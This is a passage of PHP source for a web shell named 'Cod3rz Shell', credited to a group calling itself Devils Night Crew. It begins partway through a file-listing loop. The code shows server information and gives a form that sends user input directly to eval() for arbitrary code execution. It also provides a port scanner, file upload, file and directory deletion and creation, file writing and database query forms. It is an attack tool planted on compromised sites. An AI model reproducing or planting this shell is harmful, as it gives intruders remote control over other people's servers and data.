 '.$list.' </a><br></td><td>' . $typezz . '</td><td width=15%>' . $lolx .'</td><td>' . substr(sprintf('%o', fileperms($list)), -4) . '</tr>'; }  }
	}			
 
 
	closedir($open);
 
		} 
$fileq = $pahtw + $filew;   }
 
 
 
 
 
echo "
<html>
<head><title>$site - Cod3rz</title>
<style>
table.sample {
	border-width: 1px;
	border-spacing: 1px;
	border-style: solid;
	border-color: #a6a6a6;
	border-collapse: separate;
	background-color: rgb(98, 97,97);
}
table.sample td {
	border-width: 1px;
	padding: 1px;
	border-style: none;
	border-color: #a6a6a6;
	background-color: #000000;
	-moz-border-radius: 0px;
}
input,textarea,select {
font: normal 11px Verdana, Arial, Helvetica, sans-serif;
background-color:black;
color:#a6a6a6;
border: solid 1px #363636;
}
</style>
</head>
<body bgcolor='#000000' text='#ebebeb' link='#ebebeb' alink='#ebebeb' vlink='#ebebeb'>
<center>
<b><font size='6' face='Webdings'>!</font>
<font face='Verdana' size='5'><a href='http://cod3rz.helloweb.eu'>Cod3rz Shell</font></a>
<font size='6' face='Webdings'>!</font></b>
</center>
<hr>
<p align='left'>
<font size='2' face='Verdana'><b>
Site:  $site <br>
Server Name: " . $_SERVER['SERVER_NAME'] . " <br>
Software:  $info <br>
Uname -a: $uname <br>
Path: " . $_SERVER['DOCUMENT_ROOT'] . " <br>
Safe Mode:  $safemode <br>
Magic Quotes : $quot <br>
Free Space: " . view_size($free) . " <br>
Total Space: " . view_size($all) . " <br>
 
<a href='?cmd=phpinfo' target='_blank'>View PhpInfo</a></p>
<hr>
<center><font size='1'> :: Total Files: $fileq [$filew files and $pahtw directory] ::</font></center>
<hr><center><table class=sample width=100%>
<font size='1'>
<td><b>File Name:</b></td><td><b>Type:</b></td><td width=15%><b>Size:</b></td><td width=10%><b>Perms:</b></td>$listf</font>
</table></center>
<br>
<table class='sample' cellspacing='0' cellpadding='0' border='0' width='100%'><td>
<center><b><font size='2' face='Verdana'>:: Eval PHP code ::<br></font></b>";
if(!isset($phpeval))
{
echo "
	<form method='post' action=''>
	<textarea name=php_eval cols=100 rows=5></textarea><br>
	<input type='submit' value='Execute!'>
	</form>
";
}
 
if(isset($phpeval)) {
echo "
<form method='post' action=''>
<textarea name=php_eval cols=100 rows=10>";
 $eval = @str_replace("<?","",$phpeval);
 $eval = @str_replace("?>","",$eval);
 @eval($phpeval);
echo "</textarea><br><input type='submit' value='Execute!'></form>";
 
}
echo "</center></td></table>";
echo "
<table class='sample' cellspacing='0' cellpadding='0' border='0' width='100%'>
<tr>
<td>
<center><b><font size='2' face='Verdana'>:: Go Dir ::<br></font></b>
<form name='directory' method='post' action=''>
<input type='text' name='dir' value=$path> 
<input type='submit' value='Go'>
</form></td>
<td>
<center><b><font size='2' face='Verdana'>:: Port Scanner ::<br></font></b>
	<form name='scanner' method='post'>
	<input type='text' name='host' value='127.0.0.1' >
	<select name='protocol'>
	<option value='tcp'>tcp</option>
	<option value='udp'>udp</option>
	</select>
	<input type='submit' value='Scan Ports'>
	</form>";
if(isset($host) && isset($proto))
{
echo "<strong>Open Ports:</strong>";
 
for($current = 0; $current <= 23; $current++)
{
$currents = $myports[$current];
 
$service = getservbyport($currents, $proto);
 
 
// Try to connect to port
$result = fsockopen($host, $currents, $errno, $errstr, 1);
 
// Show results
if($result)
{
echo "$currents, ";
}
 
 
}
}
 
echo "
</td></tr>
 
<tr>
<td width=50%>
<center><b><font size='2' face='Verdana'>:: Upload Files ::<br></font></b>
	<form method='post' action='' enctype='multipart/form-data'>
	<input type='file' name='ffile'>
	<input type='submit' name='ok' value='Upload File'>
	</center>	
	</form>
</td>
<td>
<center><b><font size='2' face='Verdana'>:: Delete Files ::<br></font></b>
	<form method='post' action=''>
	<input type='text' name='delete' value=$path > <input type='submit' value='Delete file'>
	</center>
	</form>
</td></tr>
<tr>
<td>
<center><b><font size='2' face='Verdana'>:: Make Directory ::<br></font></b>
	<form method='post' action=''>
	<input type='text' name='makedir'> <input type='submit' value='Make'>
	</center>
	</form>
</td>
<td>
<center><b><font size='2' face='Verdana'>:: Delete Directory ::<br></font></b>
	<form method='post' action=''>
	<input type='text' name='deletedir' value=$path> <input type='submit' value='Delete'>
	</center>
	</form>
</td></tr>
<tr>
<td width=50%>
<center><b><font size='2' face='Verdana'>:: Make File ::<br></font></b>
	<form method='post' action=''>
	<font size='1'>Title:</font><br>
	<input type='text' name='names' size='30'><br>
	<font size='1'>Source:</font><br>
	<textarea rows='10' cols='30' name='source'></textarea><br>
	<input type='submit' value='Upload'>
	</center>
	</form>
</td>
<td width=50%>
<center><b><font size='2' face='Verdana'>:: Send Query ::<br></font></b>
	<form method='post' action=''>
	<font size='1'>DB Name:</font><br>
	<input type='text' name='db' size='30'><br>
	<font size='1'>Query:</font><br>
	<textarea rows='10' cols='30' name='query'></textarea><br>
	<input type='submit' value='Go'>
	</center>
	</form>
</td></tr>
 
</table>
<br />
<table class='sample' cellspacing='0' cellpadding='0' border='0' width='100%'>
<tr>
<td>
<center><b><font size='1'>
:: Powered by Cod3rz - Devils Night Crew - <a href='http://cod3rz.helloweb.eu'>http://cod3rz.helloweb.eu</a> - <a href='http://devilsnight.altervista.org'>http://devilsnight.altervista.org</a> - v2.0 ::
</center></font></td></tr>
";
 
?>